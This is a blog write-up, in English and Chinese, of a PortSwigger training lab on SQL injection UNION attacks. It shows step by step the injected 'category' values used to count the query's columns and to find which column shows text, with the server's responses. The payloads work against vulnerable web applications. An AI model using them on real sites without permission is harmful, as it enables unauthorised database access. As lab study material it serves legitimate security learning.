---
layout: post
title: "SQL injection UNION attack, finding a column containing text"
description: ""
date: 2023-07-11
categories:
  - PortSwigger_Lab
  - PortSwigger_SQL_Injection
author: ""
tags: ['PortSwigger_Lab', 'SQL_Injection']
---





# SQL injection UNION attack, finding a column containing text


```
This lab contains an SQL injection vulnerability in the product category filter. The results from the query are returned in the application's response, so you can use a UNION attack to retrieve data from other tables. To construct such an attack, you first need to determine the number of columns returned by the query. You can do this using a technique you learned in a [previous lab](https://portswigger.net/web-security/sql-injection/union-attacks/lab-determine-number-of-columns). The next step is to identify a column that is compatible with string data.

The lab will provide a random value that you need to make appear within the query results. To solve the lab, perform an [SQL injection UNION](https://portswigger.net/web-security/sql-injection/union-attacks) attack that returns an additional row containing the value provided. This technique helps you determine which columns are compatible with string data.

#### Solution

1.  Use Burp Suite to intercept and modify the request that sets the product category filter.
2.  Determine the [number of columns that are being returned by the query](https://portswigger.net/web-security/sql-injection/union-attacks/lab-determine-number-of-columns). Verify that the query is returning three columns, using the following payload in the `category` parameter:
    
    `'+UNION+SELECT+NULL,NULL,NULL--`
3.  Try replacing each null with the random value provided by the lab, for example:
    
    `'+UNION+SELECT+'abcdef',NULL,NULL--`
4.  If an error occurs, move on to the next null and try that instead.



本實驗室在產品類別過濾器中包含一個 SQL 注入漏洞。查詢的結果在應用程序的響應中返回，因此您可以使用 UNION 攻擊從其他表中檢索數據。要構造這樣的攻擊，首先需要確定查詢返回的列數。您可以使用在之前的實驗室中學到的技術來做到這一點。下一步是識別與字符串數據兼容的列。

實驗室將提供您需要在查詢結果中顯示的隨機值。要解決該實驗，請執行 SQL 注入 UNION 攻擊，該攻擊會返回包含所提供值的附加行。此技術可幫助您確定哪些列與字符串數據兼容。

解決方案
使用 Burp Suite 攔截和修改設置產品類別過濾器的請求。

確定查詢返回的列數。使用 category 參數中的以下負載驗證查詢是否返回三列：
'+UNION+SELECT+NULL,NULL,NULL--

嘗試將每個 null 替換為實驗室提供的隨機值，例如：
'+UNION+SELECT+'abcdef',NULL,NULL--
如果發生錯誤，請轉到下一個 null 並嘗試代替。



```

get 請求 
```
category=Food+%26+Drink
```



測試聯合查詢需要多少列:
```
category=Food+%26+Drink' UNION SELECT NULL--
//Internal Server Error


category=Food+%26+Drink' UNION SELECT NULL,NULL--
//Internal Server Error


category=Food+%26+Drink' UNION SELECT NULL,NULL,NULL--
//有正確查詢

```

結果:3列



我們要知道三個列，哪個是屬於字串的類型。
知道後，代表我們撈出來的資料，能透過這個字串欄位顯示出來。

```
category=Food+%26+Drink' UNION SELECT NULL,NULL,NULL--
```

```
category=Food+%26+Drink' UNION SELECT 'aaa',NULL,NULL--
//Internal Server Error


category=Food+%26+Drink' UNION SELECT NUll,'aaa',NULL--
//有畫面顯示aaa



category=Food+%26+Drink' UNION SELECT NUll,NULL,'aaa'--
//Internal Server Error

```


而此時上面題目給了個亂數
```
Make the database retrieve the string: 'L7QEls'
```


把它加進第2列就可以。


```
category=Food+%26+Drink' UNION SELECT NUll,'L7QEls',NULL--

```


成功。



